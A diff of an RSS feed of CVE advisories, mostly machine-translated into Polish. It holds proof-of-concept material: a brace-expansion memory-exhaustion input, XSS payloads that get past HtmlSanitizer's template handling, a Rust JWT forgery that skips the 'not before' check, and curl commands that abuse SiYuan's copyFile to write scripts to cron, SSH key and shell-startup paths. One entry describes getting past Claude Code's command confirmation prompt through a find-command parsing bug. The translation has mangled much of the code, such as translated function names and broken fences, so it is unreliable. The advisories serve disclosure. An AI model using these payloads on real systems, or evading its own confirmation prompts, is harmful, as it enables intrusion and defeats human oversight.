+Luka występuje, ponieważ `@isaacs/brace-expansion` rozwija wyrażenia nawiasowe bez górnej granicy ani limitu złożoności.Ekspansja jest wykonywana szybko i synchronicznie, co oznacza, że ​​pełny zestaw wyników jest generowany przed oddaniem kontroli obiektowi wywołującemu.
+
+Na przykład następujące dane wejściowe:
+
+```
+{0..99}{0..99}{0..99}{0..99}{0..99}
+```
+
+produkuje:
+
+```
+100^5 = 10 000 000 000 kombinacji
+```
+
+Ten wykładniczy wzrost może szybko przeciążyć pętlę zdarzeń i pamięć sterty, powodując zakończenie procesu.
+
+### Dowód koncepcji
+
+Poniższy skrypt niezawodnie powoduje problem.
+
+Utwórz plik `poc.js`:
+
+```j
+const { rozwiń } = wymagaj('@isaacs/rozszerzenie-nawiasu');
+
+stały wzór = '{0..99}{0..99}{0..99}{0..99}{0..99}';
+
+console.log('Rozpoczęcie rozbudowy...');
+rozwiń(wzór);
+```
+
+Uruchom to:
+
+,,bicie
+węzeł poc.js
+```
+
+Proces zawiesza się i zazwyczaj ulega awarii z powodu błędu, takiego jak:
+
+```
+BŁĄD KRYTYCZNY: brak pamięci w stercie JavaScript
+```
+
+### Wpływ
+
+Jest to luka umożliwiająca odmowę usługi.Dowolna aplikacja lub podrzędna zależność, która używa `@isaacs/brace-expansion` na niezaufanych danych wejściowych, może być podatna na awarię przy pojedynczym żądaniu.
+
+Osoba atakująca nie wymaga uwierzytelniania i może wykorzystać bardzo mały ładunek, aby:
+
+* Wyzwalanie obliczeń wykładniczych
+* Wyczerpywanie zasobów pamięci i procesora
+* Zablokuj pętlę zdarzeń
+* Awaria usług Node.js korzystających z tej biblioteki</description></item><item><title>CVE-2026-24887</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24887</link><pubDate>Tue, 03 Feb 2026 19:33:32 +0000</pubDate><description>Z powodu błędu w analizie poleceń możliwe było ominięcie monitu o potwierdzenie kodu Claude'a, aby uruchomić wykonanie niezaufanych poleceń za pomocą polecenia find.Niezawodne wykorzystanie tego wymagało możliwości dodania niezaufanej zawartości do okna kontekstowego Claude Code.
 
 Użytkownicy korzystający ze standardowej automatycznej aktualizacji Claude Code otrzymali już tę poprawkę.Użytkownikom dokonującym ręcznych aktualizacji zaleca się aktualizację do najnowszej wersji.
 
@@ -787,7 +1371,28 @@ opóźnienia i retransmisje, odbiorca musi przeprowadzić przynajmniej minimaln�
 numery przed odrzuceniem lub przetworzeniem wiadomości;obecna implementacja nie „zerka” jednak tylko na minimum
 nagłówek i zamiast tego analizuje całą sekcję `DataHolderSeq`.W rezultacie przed wersjami 3.4.1, 3.3.1 i 2.6.11 ten parsi
 ng może wywołać stan braku pamięci i zdalnie zakończyć proces.Wersje 3.4.1, 3.3.1 i 2.6.11 s
-podłącz problem.</description></item><item><title>CVE-2026-25616</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25616</link><pubDate>Tue, 03 Feb 2026 19:21:14 +0000</pubDate><description>Blesta 3.x do 5.x przed wersją 5.13.3 błędnie obsługuje sprawdzanie poprawności danych wejściowych, czyli CORE-5665.
+podłącz problem.</description></item><item><title>CVE-2026-25543</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25543</link><pubDate>Tue, 03 Feb 2026 19:22:06 +0000</pubDate><description>### Wpływ
+
+Jeśli tag `template` jest dozwolony, jego zawartość nie jest oczyszczana.Znacznik `template` jest specjalnym znacznikiem, który zwykle nie renderuje swojej zawartości, chyba że atrybut `shadowrootmode` jest ustawiony na ``otwarty'' lub 'zamknięty'.
+
+Brak oczyszczenia tagu szablonu powoduje dwa obejścia:
+
+1. nadal możliwe jest wymuszenie renderowania zawartości znacznika `&lt;template&gt;` poprzez mutację XSS.Parsery DOM w przeglądarkach takich jak Chromium mają limit głębokości węzłów wynoszący 512, a znaczniki przekraczające tę głębokość są spłaszczane.To z kolei umożliwia skuteczne „wyskakiwanie” elementów z `&lt;template&gt;` (które nie zostały oczyszczone).Przykład mógłby wyglądać następująco: `&lt;div&gt;[...]&lt;template&gt;&lt;script&gt;alert('xss')&lt;/script&gt;` gdzie `[...]` oznacza co najmniej kolejnych 509 otwierających tagów `&lt;div&gt;`.
+2. Jeśli oprócz znacznika szablonu, atrybut `shadowrootmode` jest dozwolony przez `sanitizer.AllowedAttributes.Add("shadowrootmode");`, prosty ładunek `&lt;div&gt;&lt;template Shadowrootmode="open"&gt;&lt;script&gt;alert('xss')&lt;/script&gt;` ominie moduł sanityzujący.Dzieje się tak, ponieważ takie użycie `&lt;template&gt;` powoduje dołączenie cienia do jego elementu nadrzędnego: `&lt;div&gt;`, a jego zawartość zostanie wyrenderowana.
+
+Należy pamiętać, że nie ma to wpływu na domyślną konfigurację, ponieważ tag `template` jest domyślnie niedozwolony.
+
+### Poprawki
+
+Problem został załatany w wersjach [9.0.892](https://www.nuget.org/packages/HtmlSanitizer/9.0.892) i [9.1.893-beta](https://www.nuget.org/packages/HtmlSanitizer/9.1.893-beta).
+
+### Obejścia
+
+Nie zezwalaj na tag `template`.Domyślnie jest to zabronione.
+
+### Zasoby
+
+https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template</description></item><item><title>CVE-2026-25616</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25616</link><pubDate>Tue, 03 Feb 2026 19:21:14 +0000</pubDate><description>Blesta 3.x do 5.x przed wersją 5.13.3 błędnie obsługuje sprawdzanie poprawności danych wejściowych, czyli CORE-5665.
 
 CVSS Score: 4.7 (medium)</description></item><item><title>CVE-2026-24427</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24427</link><pubDate>Tue, 03 Feb 2026 19:11:32 +0000</pubDate><description>Wersja oprogramowania sprzętowego Shenzhen Tenda AC7 V03.03.03.01_cn i wcześniejsza ujawnia poufne informacje w odpowiedziach zarządzania siecią.Poświadczenia administracyjne, w tym hasło routera i/lub panelu administracyjnego, są zawarte w postaci zwykłego tekstu w treści odpowiedzi dotyczących konfiguracji.Ponadto w odpowiedziach brakuje odpowiednich dyrektyw dotyczących kontroli pamięci podręcznej, które mogą zezwalać przeglądarkom internetowym na buforowanie stron zawierających te dane uwierzytelniające i umożliwiać ich późniejsze ujawnienie osobie atakującej mającej dostęp do systemu klienckiego lub profilu przeglądarki.</description></item><item><title>CVE-2025-62600</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-62600</link><pubDate>Tue, 03 Feb 2026 19:11:19 +0000</pubDate><description>Fast DDS to implementacja C++ standardu DDS (Data Distribution Service) firmy OMG (Object Management Group)
 ).Przed wersjami 3.4.1, 3.3.1 i 2.6.11, gdy tryb bezpieczeństwa jest włączony, modyfikowanie podkomunikatu DATA w
@@ -796,7 +1401,138 @@ pola PID_IDENTITY_TOKEN lub PID_PERMISSION_TOKEN w podkomunikacie DATA — w szc
 pole w readBinaryPropertySeq — są modyfikowane, następuje przepełnienie liczby całkowitej, co prowadzi do OOM podczas operacji zmiany rozmiaru.
 Wersje 3.4.1, 3.3.1 i 2.6.11 łatają ten problem.</description></item><item><title>CVE-2026-24426</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24426</link><pubDate>Tue, 03 Feb 2026 19:09:37 +0000</pubDate><description>Oprogramowanie sprzętowe Shenzhen Tenda AC7 w wersji V03.03.03.01_cn i wcześniejsze zawiera lukę w zabezpieczeniach nieprawidłowego kodowania danych wyjściowych w internetowym interfejsie zarządzania.Dane wprowadzone przez użytkownika są odzwierciedlane w odpowiedziach HTTP bez odpowiedniej ucieczki, umożliwiając wstrzyknięcie dowolnego kodu HTML lub JavaScript do kontekstu przeglądarki ofiary.</description></item><item><title>CVE-2026-1802</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1802</link><pubDate>Tue, 03 Feb 2026 19:02:06 +0000</pubDate><description>W Ziroom ZHOME A0101 1.0.1.0 wykryto lukę w zabezpieczeniach.Ten problem dotyczy funkcji macAddrClone pliku luci\controller\api\zrMacClone.lua.Manipulacja argumentem macType powoduje wstrzyknięcie polecenia.Atak może zostać przeprowadzony zdalnie.Exploit został udostępniony publicznie i może zostać wykorzystany do ataków.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
 
-CVSS Score: 7.3 (high)</description></item><item><title>CVE-2026-25502</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25502</link><pubDate>Tue, 03 Feb 2026 18:36:36 +0000</pubDate><description>iccDEV zapewnia zestaw bibliotek i narzędzi umożliwiających interakcję, manipulowanie i stosowanie profili zarządzania kolorami ICC.Przed wersją 2.3.1.2 przepełnienie bufora opartego na stosie w funkcji icFixXml() podczas przetwarzania zniekształconych profili ICC umożliwiało potencjalne wykonanie dowolnego kodu za pomocą spreparowanych znaczników NamedColor2.Ten problem został naprawiony w wersji 2.3.1.2.
+CVSS Score: 7.3 (high)</description></item><item><title>CVE-2026-25537</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25537</link><pubDate>Tue, 03 Feb 2026 18:47:40 +0000</pubDate><description>## Summary:
+
+It has been discovered that there is a Type Confusion vulnerability in jsonwebtoken, specifically, in its claim validation logic.
+
+When a standard claim (such as nbf or exp) is provided with an incorrect JSON type (Like a String instead of a Number), the library’s internal parsing mechanism marks the claim as “FailedToParse”. Crucially, the validation logic treats this “FailedToParse” state identically to “NotPresent”.
+
+This means that if a check is enabled (like: validate_nbf = true), but the claim is not explicitly marked as required in required_spec_claims, the library will skip the validation check entirely for the malformed claim, treating it as if it were not there. This allows attackers to bypass critical time-based security restrictions (like “Not Before” checks) and commit potential authentication and authorization bypasses.
+
+## Details:
+
+The vulnerability stems from the interaction between the TryParse enum and the validate function in [src/validation.rs](https://github.com/Keats/jsonwebtoken/blob/master/src/validation.rs).
+
+ 1. The TryParse Enum: The library uses a custom TryParse enum to handle claim deserialization:
+```
+enum TryParse&lt;T&gt; {
+    Parsed(T),
+    FailedToParse, // Set when deserialization fails (e.g. type mismatch)
+    NotPresent,
+}
+```
+If a user sends {“nbf”: “99999999999”} (legacy/string format), serde fails to parse it as u64, and it results in TryParse::FailedToParse.
+
+ 1. The Validation Logic Flaw (src/validation.rs): In Validation::validate, the code checks for exp and nbf
+like this:
+```
+// L288-291
+if matches!(claims.nbf, TryParse::Parsed(nbf) if options.validate_nbf &amp;&amp; nbf &gt; now + options.leeway) {
+    return Err(new_error(ErrorKind::ImmatureSignature));
+}
+```
+This matches! macro explicitly looks for TryParse::Parsed(nbf).
+
+ • If claims.nbf is FailedToParse, the match returns false.
+ • The if block is skipped.
+ • No error is returned.
+ 1. The “Required Claims” Gap: The only fallback mechanism is the “Required Claims” check:
+```
+// Lines 259-267
+for required_claim in &amp;options.required_spec_claims {
+    let present = match required_claim.as_str() {
+        "nbf" =&gt; matches!(claims.nbf, TryParse::Parsed(_)),
+        // ...
+    };
+    if !present { return Err(...); }
+}
+```
+If “nbf” IS in required_spec_claims, FailedToParse will fail the matches!(..., Parsed(_)) check, causing the present to be false, and correctly returning an error.
+
+However, widely accepted usage patterns often enable validation flags (validate_nbf = true) without adding the claim to the required list, assuming that enabling validation implicitly requires the claim’s validity if it appears in the token. jsonwebtoken seems to violate this assumption.
+
+Environment:
+
+ • Version: jsonwebtoken 10.2.0
+ • Rust Version: rustc 1.90.0
+ • Cargo Version: cargo 1.90.0
+ • OS: MacOS Tahoe 26.2
+
+POC:
+
+For demonstrating, Here is this simple rust code that demonstrates the bypass. It attempts to validate a token with a string nbf claiming to be valid only in the far future.
+
+create a new project:
+```
+cargo new nbf_poc; cd nbf_poc
+```
+add required dependencies:
+```
+cargo add serde --features derive
+cargo add jsonwebtoken --features rust_crypto
+cargo add serde_json
+```
+replace the code in src/main.rs with this:
+
+```
+use jsonwebtoken::{decode, Validation, Algorithm, DecodingKey, Header, EncodingKey, encode};
+use serde::{Deserialize, Serialize};
+
+#[derive(Debug, Serialize, Deserialize)]
+struct Claims {
+    sub: String,
+    nbf: String, // Attacker sends nbf as a String
+    exp: usize,
+}
+fn main() {
+    let key: &amp;[u8; 24] = b"RedMouseOverTheSkyIsBlue";
+
+    // nbf is a String "99999999999" (Far future)
+    // Real nbf should be a Number.
+    let my_claims: Claims = Claims {
+        sub: "krishna".to_string(),
+        nbf: "99999999999".to_string(), 
+        exp: 10000000000, 
+    };
+
+    let token: String = encode(&amp;Header::default(), &amp;my_claims, &amp;EncodingKey::from_secret(key)).unwrap();
+    println!("Forged Token: {}", token);
+
+    // 2. Configure Validation
+    let mut validation: Validation = Validation::new(Algorithm::HS256);
+    validation.validate_nbf = true; // Enable NBF check
+
+    // We do NOT add "nbf" to required_spec_claims (default behavior)
+
+    // We decode to serde_json::Value to avoid strict type errors in our struct definition hiding the library bug.
+    // The library sees the raw JSON with string "nbf".
+    let result: Result&lt;jsonwebtoken::TokenData&lt;serde_json::Value&gt;, jsonwebtoken::errors::Error&gt; = decode::&lt;serde_json::Value&gt;(
+        &amp;token, 
+        &amp;DecodingKey::from_secret(key), 
+        &amp;validation
+    );
+
+    match result {
+        Ok(_) =&gt; println!("Token was accepted despite malformed far-future 'nbf'!"),
+        Err(e) =&gt; println!("Token rejected. Error: {:?}", e),
+    }
+}
+```
+run cargo run
+
+expected behaviour:
+
+```
+Forged Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJrcmlzaG5hIiwibmJmIjoiOTk5OTk5OTk5OTkiLCJleHAiOjEwMDAwMDAwMDAwfQ.Fm3kZIqMwqIA6sEA1w52UOMqqnu4hlO3FQStFmbaOwk
+```
+Token was accepted despite malformed far-future 'nbf'!
+Impact:
+
+If an application uses jsonwebtoken nbf (Not Before) to schedule access for the future (like “Access granted starting tomorrow”).
+
+By sending nbf as a string, an attacker can bypass this restriction and access the resource immediately.
+
+and for the exp claim (this is unlikely but still adding), If a developer sets validate_exp = true but manually handles claim presence (removing exp from required_spec_claims), an attacker can send a string exp (e.g., “never”) and bypass expiration checks entirely. The token becomes valid forever.</description></item><item><title>CVE-2026-25502</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25502</link><pubDate>Tue, 03 Feb 2026 18:36:36 +0000</pubDate><description>iccDEV zapewnia zestaw bibliotek i narzędzi umożliwiających interakcję, manipulowanie i stosowanie profili zarządzania kolorami ICC.Przed wersją 2.3.1.2 przepełnienie bufora opartego na stosie w funkcji icFixXml() podczas przetwarzania zniekształconych profili ICC umożliwiało potencjalne wykonanie dowolnego kodu za pomocą spreparowanych znaczników NamedColor2.Ten problem został naprawiony w wersji 2.3.1.2.
 
 CVSS Score: 7.8 (high)</description></item><item><title>CVE-2026-25517</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25517</link><pubDate>Tue, 03 Feb 2026 18:35:52 +0000</pubDate><description>### Wpływ
 Ze względu na brak kontroli uprawnień w punktach końcowych podglądu użytkownik mający dostęp do panelu administracyjnego Pliszka i wiedzę o polach modelu może utworzyć formularz, aby uzyskać podgląd renderowania dowolnej strony, fragmentu lub obiektu ustawień witryny, dla którego włączony jest podgląd, zawierający dowolne dane wybrane przez użytkownika.Istniejące dane samego obiektu nie są ujawniane, ale w zależności od charakteru renderowanego szablonu mogą ujawnić inną zawartość bazy danych, która w przeciwnym razie byłaby dostępna tylko dla użytkowników z uprawnieniami do edycji modelu.Luki nie może wykorzystać zwykły użytkownik witryny bez dostępu do administratora Pliszki.
@@ -4130,7 +4866,127 @@ konsola.log(wynik.isAdmin);// prawda
 ### Przypadki użycia, których to dotyczy
 
 - Rozszerzanie obiektów na podstawie danych wejściowych użytkownika lub zewnętrznych interfejsów API
-- Łączenie opcji z niezaufanych źródeł</description></item><item><title>CVE-2026-1594</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1594</link><pubDate>Thu, 29 Jan 2026 14:32:08 +0000</pubDate><description>W itsourcecode Society Management System 1.0 wykryto lukę w zabezpieczeniach.Problemem dotknięta jest nieznana funkcja pliku /admin/add_expenses.php.Manipulacja szczegółami argumentu prowadzi do wstrzyknięcia sql.Możliwe jest zdalne wykorzystanie ataku.Exploit został ujawniony publicznie i może zostać wykorzystany.
+- Łączenie opcji z niezaufanych źródeł</description></item><item><title>CVE-2026-25539</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25539</link><pubDate>Thu, 29 Jan 2026 15:15:54 +0000</pubDate><description>## Podsumowanie
+
+Punkt końcowy `/api/file/copyFile` nie sprawdza poprawności parametru `dest`, umożliwiając uwierzytelnionym użytkownikom zapisywanie plików w dowolnych lokalizacjach w systemie plików.Może to prowadzić do zdalnego wykonania kodu (RCE) poprzez zapisanie w poufnych lokalizacjach, takich jak zadania cron, autoryzowane_klucze SSH lub pliki konfiguracyjne powłoki.
+
+- Wersja, której dotyczy problem: 3.5.3 (i prawdopodobnie wszystkie wcześniejsze wersje)
+
+## Szczegóły
+
+- Typ: Niewłaściwe ograniczenie nazwy ścieżki do katalogu z ograniczeniami (CWE-22)
+- Lokalizacja: `kernel/api/file.go` - funkcja copyFile
+
+idź
+// kernel/api/file.go linie 94-139
+func copyFile(c *gin.Context) {
+// ...
+src := arg["źródło"].(string)
+src, err := model.GetAssetAbsPath(src) // src zostało sprawdzone
+// ...
+
+dest := arg["dest"].(string) // dest NIE został zatwierdzony!
+if err = filelock.Copy(src, dest);błąd!= zero {
+// ...
+}
+}
+```
+
+Parametr `src` jest poprawnie sprawdzany za pomocą `model.GetAssetAbsPath()`, ale parametr `dest` akceptuje dowolną ścieżkę bezwzględną bez sprawdzania poprawności, umożliwiając zapisywanie plików poza katalogiem obszaru roboczego.
+
+## PoC
+
+### Krok 1: Prześlij złośliwą zawartość do obszaru roboczego
+
+,,bicie
+curl -X POST "http://target:6806/api/file/putFile" \
+-H "Autoryzacja: Token &lt;API_TOKEN&gt;" \
+-F "ścieżka=/dane/aktywa/złośliwy.sh" \
+-F "plik=@-;nazwa pliku=złośliwy.sh" &lt;&lt;&lt; '#!/bin/sh
+identyfikator &gt; /tmp/pwned.txt
+nazwa hosta &gt;&gt; /tmp/pwned.txt'
+```
+
+### Krok 2: Skopiuj do dowolnej lokalizacji (np. /tmp)
+
+,,bicie
+curl -X POST "http://target:6806/api/file/copyFile" \
+-H "Autoryzacja: Token &lt;API_TOKEN&gt;" \
+-H "Typ zawartości: aplikacja/json" \
+-d '{"src": "assets/malicious.sh", "dest": "/tmp/malicious.sh"}'
+```
+
+Odpowiedź: `{"code":0,"msg":"","data":null}`
+
+### Krok 3: Sprawdź, czy plik został zapisany poza obszarem roboczym
+
+,,bicie
+kot /tmp/malicious.sh
+# Wyjście: #!/bin/sh
+# identyfikator &gt; /tmp/pwned.txt
+# nazwa hosta &gt;&gt; /tmp/pwned.txt
+```
+
+## Scenariusze ataku
+
+|Ścieżka docelowa |Wpływ |
+|------------|------------|
+|`/etc/cron.d/backdoor` |Zaplanowane wykonanie polecenia (RCE) |
+|`~/.ssh/authorized_keys` |Stały dostęp SSH |
+|`~/.bashrc` |Wykonanie polecenia przy logowaniu użytkownika |
+|`/etc/ld.so.preload` |Wstrzyknięcie biblioteki współdzielonej |
+
+### Demonstracja RCE
+
+RCE zostało pomyślnie zademonstrowane poprzez napisanie skryptu i wykonanie go:
+
+,,bicie
+# Napisz skrypt do /tmp
+curl -X POST "http://target:6806/api/file/copyFile" \
+-H "Autoryzacja: Token &lt;API_TOKEN&gt;" \
+-d '{"src": "assets/malicious.sh", "dest": "/tmp/malicious.sh"}'
+
+# Wykonaj (symulacja cron lub wyzwalacza logowania)
+sh /tmp/malicious.sh
+
+# Wynik
+cat /tmp/pwned.txt
+# uid=0(root) gid=0(root) groups=0(root)...
+```
+
+## Wpływ
+
+Uwierzytelniony atakujący (z tokenem API) może:
+1. Osiągnij zdalne wykonanie kodu z uprawnieniami procesu SiYuan
+2. Ustanów trwały dostęp backdoorem za pomocą kluczy SSH
+3. Złam cały system hosta
+4. Uzyskaj dostęp do wrażliwych danych w tej samej sieci (ruch boczny)
+
+## Sugerowana poprawka
+
+Dodaj weryfikację ścieżki, aby upewnić się, że `dest` znajduje się w katalogu obszaru roboczego:
+
+idź
+func copyFile(c *gin.Context) {
+// ...
+miejsce docelowe:= arg["miejsce docelowe"].(string)
+
+// Dodaj weryfikację
+if !util.IsSubPath(util.WorkspaceDir, dest) {
+kod ret. = -1
+ret.Msg = "ścieżka docelowa musi znajdować się w obszarze roboczym"
+wrócić
+}
+
+if err = filelock.Copy(src, dest);błąd!= zero {
+// ...
+}
+}
+```
+
+## Rozwiązanie
+
+d7f790755edf8c78d2b4176171e5a0cdcd720lut</description></item><item><title>CVE-2026-1594</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1594</link><pubDate>Thu, 29 Jan 2026 14:32:08 +0000</pubDate><description>W itsourcecode Society Management System 1.0 wykryto lukę w zabezpieczeniach.Problemem dotknięta jest nieznana funkcja pliku /admin/add_expenses.php.Manipulacja szczegółami argumentu prowadzi do wstrzyknięcia sql.Możliwe jest zdalne wykorzystanie ataku.Exploit został ujawniony publicznie i może zostać wykorzystany.
 
 CVSS Score: 7.3 (high)</description></item><item><title>CVE-2026-1593</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1593</link><pubDate>Thu, 29 Jan 2026 14:32:06 +0000</pubDate><description>W systemie zarządzania społeczeństwem itsourcecode 1.0 wykryto słabość.Podatnością dotknięta jest nieznana funkcja w pliku /admin/edit_expenses_query.php.Wykonanie manipulacji szczegółami argumentu może prowadzić do wstrzyknięcia sql.Atak może zostać przeprowadzony zdalnie.Exploit został udostępniony publicznie i może zostać wykorzystany do ataków.
 
